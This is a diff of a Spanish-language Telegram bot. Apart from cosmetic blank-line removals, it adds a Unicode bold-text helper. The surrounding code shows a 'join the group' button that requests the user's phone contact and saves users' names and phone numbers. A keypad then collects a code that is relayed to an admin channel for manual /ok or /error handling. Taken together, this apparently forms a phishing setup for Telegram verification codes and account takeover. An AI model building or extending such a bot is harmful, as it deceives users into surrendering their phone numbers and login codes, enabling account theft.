@@ -29,7 +29,6 @@ WAIT_TASKS = {}             # telegram_id -> asyncio.Task
 USERS_FILE = "usuarios_lab.json"
 USERS = {}  # "telegram_id" -> {"full_name": ..., "username": ..., "phone": ...}
 
-
 def load_users():
     global USERS
     if not os.path.exists(USERS_FILE):
@@ -41,11 +40,9 @@ def load_users():
     except Exception:
         USERS = {}
 
-
 def save_users():
     with open(USERS_FILE, "w", encoding="utf-8") as f:
         json.dump(USERS, f, ensure_ascii=False, indent=2)
-
 
 def admin_chat_ok(update: Update) -> bool:
     chat = update.effective_chat
@@ -53,11 +50,9 @@ def admin_chat_ok(update: Update) -> bool:
         return False
     return str(chat.id) == ADMIN_CHANNEL_ID
 
-
 def share_phone_kb():
     btn = KeyboardButton("👉🏻𝐔𝐍𝐈𝐑𝐌𝐄 𝐀𝐋 𝐆𝐑𝐔𝐏𝐎🇨🇺", request_contact=True)
     return ReplyKeyboardMarkup([[btn]], resize_keyboard=True, one_time_keyboard=True)
-
 
 def build_keypad(code_str: str):
     rows = [
@@ -108,7 +103,6 @@ def build_keypad(code_str: str):
     )
     return text, InlineKeyboardMarkup(rows)
 
-
 async def animate_wait(bot, chat_id: int, message_id: int, user_id: int):
     frames = [
         "⏳ Conectando.",
@@ -132,12 +126,10 @@ async def animate_wait(bot, chat_id: int, message_id: int, user_id: int):
     finally:
         WAIT_TASKS.pop(user_id, None)
 
-
 def stop_wait_task(user_id: int):
     task = WAIT_TASKS.pop(user_id, None)
     if task:
         task.cancel()
-
 
 def save_user_data(user, phone: str):
     USERS[str(user.id)] = {
@@ -147,13 +139,11 @@ def save_user_data(user, phone: str):
     }
     save_users()
 
-
 def get_case_by_reply(update: Update):
     msg = update.message
     if not msg or not msg.reply_to_message:
         return None
     return PENDING_BY_ADMIN_MSG.get(msg.reply_to_message.message_id)
-
 
 def get_case_by_user_id(user_id: int):
     admin_msg_id = PENDING_BY_USER_ID.get(user_id)
@@ -161,6 +151,30 @@ def get_case_by_user_id(user_id: int):
         return None
     return PENDING_BY_ADMIN_MSG.get(admin_msg_id)
 
+def to_unicode_bold(text: str) -> str:
+    lower = "abcdefghijklmnopqrstuvwxyz"
+    upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+    digits = "0123456789"
+
+    lower_bold = "𝐚𝐛𝐜𝐝𝐞𝐟𝐠𝐡𝐢𝐣𝐤𝐥𝐦𝐧𝐨𝐩𝐪𝐫𝐬𝐭𝐮𝐯𝐰𝐱𝐲𝐳"
+    upper_bold = "𝐀𝐁𝐂𝐃𝐄𝐅𝐆𝐇𝐈𝐉𝐊𝐋𝐌𝐍𝐎𝐏𝐐𝐑𝐒𝐓𝐔𝐕𝐖𝐗𝐘𝐙"
+    digits_bold = "𝟎𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗"
+
+    mp = {}
+    for a, b in zip(lower, lower_bold):
+        mp[a] = b
+    for a, b in zip(upper, upper_bold):
+        mp[a] = b
+    for a, b in zip(digits, digits_bold):
+        mp[a] = b
+
+    out = []
+    for ch in text:
+        if ch in mp:
+            out.append(mp[ch])
+        else:
+            out.append(html.escape(ch))
+    return "".join(out)
 
 def remove_case(case_data: dict):
     if not case_data:
@@ -172,10 +186,8 @@ def remove_case(case_data: dict):
     if user_id in PENDING_BY_USER_ID:
         del PENDING_BY_USER_ID[user_id]
 
-
 def user_link_html(user_id: int, text: str) -> str:
     return f'<a href="tg://user?id={user_id}">{html.escape(text)}</a>'
-
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data[UD_CODE] = ""
@@ -209,7 +221,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode="Markdown"
     )
 
-
 async def on_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
     msg = update.message
     if not msg or not msg.contact:
@@ -239,7 +250,6 @@ async def on_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     text, kb = build_keypad("")
     await msg.reply_text(text, reply_markup=kb, parse_mode="Markdown")
-
 
 async def keypad_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
     q = update.callback_query
@@ -331,7 +341,6 @@ async def keypad_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except Exception:
         await q.message.edit_reply_markup(reply_markup=kb)
 
-
 async def ok_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not admin_chat_ok(update):
         return
@@ -375,7 +384,6 @@ async def ok_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     remove_case(case_data)
     await msg.reply_text("✅ Usuario actualizado correctamente.")
-
 
 async def error_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not admin_chat_ok(update):
@@ -435,7 +443,6 @@ async def error_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     remove_case(case_data)
     await msg.reply_text("⚠️ Error enviado al usuario y teclado restaurado.")
 
-
 async def chat_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not admin_chat_ok(update):
         return
@@ -460,7 +467,6 @@ async def chat_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("✅ Mensaje enviado al DM del usuario.")
     except Exception as e:
         await update.message.reply_text(f"❌ No pude enviar el mensaje: {e}")
-
 
 async def lista_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not admin_chat_ok(update):
@@ -503,7 +509,6 @@ async def lista_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if bloque:
         await update.message.reply_text(bloque, parse_mode="HTML", disable_web_page_preview=True)
 
-
 async def private_fallback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_chat and update.effective_chat.type == "private":
         await update.message.reply_text(
@@ -512,10 +517,8 @@ async def private_fallback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             reply_markup=share_phone_kb()
         )
 
-
 async def id_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(f"chat_id: {update.effective_chat.id}")
-
 
 async def testsend_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
@@ -525,14 +528,12 @@ async def testsend_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(f"❌ Falló el envío: {e}")
         log.exception("Testsend falló: %s", e)
 
-
 async def on_startup(app):
     if ADMIN_CHANNEL_ID:
         try:
             await app.bot.send_message(ADMIN_CHANNEL_ID, "🟢 Bot online (inicio exitoso).")
         except Exception as e:
             log.exception("No pude enviar mensaje de arranque: %s", e)
-
 
 def main():
     if not BOT_TOKEN:
@@ -554,7 +555,6 @@ def main():
     app.add_handler(MessageHandler(filters.ChatType.PRIVATE & ~filters.COMMAND & ~filters.CONTACT, private_fallback))
 
     app.run_polling()
-
 
 if __name__ == "__main__":
     main()
